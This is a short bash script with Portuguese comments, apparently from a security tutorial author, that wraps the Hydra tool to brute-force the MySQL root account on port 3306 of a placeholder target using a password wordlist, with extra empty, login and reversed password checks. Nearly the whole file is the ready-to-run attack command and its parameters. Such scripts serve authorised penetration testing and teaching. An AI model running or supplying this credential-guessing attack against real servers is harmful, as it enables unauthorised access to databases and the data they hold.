#!/bin/bash
# Autor: Robson Vaamonde
# Site: www.procedimentosemti.com.br
# Facebook: facebook.com/ProcedimentosEmTI
# Facebook: facebook.com/BoraParaPratica
# YouTube: youtube.com/BoraParaPratica
# Data de criação: 31/10/2016
# Data de atualização: 31/10/2016
# Versão: 1.0

#Variável do comando Hydra
ALVO="www.SEU_ALVO.br"
USERNAME="root"
WORDLIST="senhas.txt"
PORT="3306"
SERVICE="mysql"

#Executando o comando Hydra com a opções: -s=Porta, -e=Checagens Adcionais, -f=Após confirmação de Login, sair do acesso, -vV=Modo Verboso, detalhado na hora de passar usuário e senhas, -L=Wordlist de Usuários, -P=Wordlist de senhas, -t=Tarefas/Tentativas
#Informações levantadas utilizando o comando Nmap
echo -e "Executando o comando Hydra no alvo: $ALVO"
echo
  hydra -t 5 -vV -f -l $USERNAME -e nsr -P $WORDLIST $ALVO $SERVICE
echo
echo -e "Fim da execução `date`"
